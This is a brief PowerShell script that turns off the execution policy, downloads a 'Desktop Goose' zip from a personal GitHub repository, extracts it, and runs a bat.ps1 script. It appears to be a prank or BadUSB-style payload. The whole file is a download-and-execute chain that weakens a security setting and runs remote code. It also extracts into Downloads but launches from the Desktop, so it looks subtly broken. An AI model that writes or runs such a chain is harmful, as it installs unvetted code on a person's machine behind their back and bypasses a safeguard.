Set-ExecutionPolicy Bypass -Scope Process -Force
$source = 'https://github.com/Giddow/sdgsdg/raw/main/Desktop%20Goose.zip'
$destination = "$env:userprofile\Downloads\yeettt.zip"
Invoke-RestMethod -Uri $source -OutFile $destination
Expand-Archive "$destination" -DestinationPath "$env:userprofile\Downloads\" -Force
cd "$env:userprofile\Desktop";.\bat.ps1
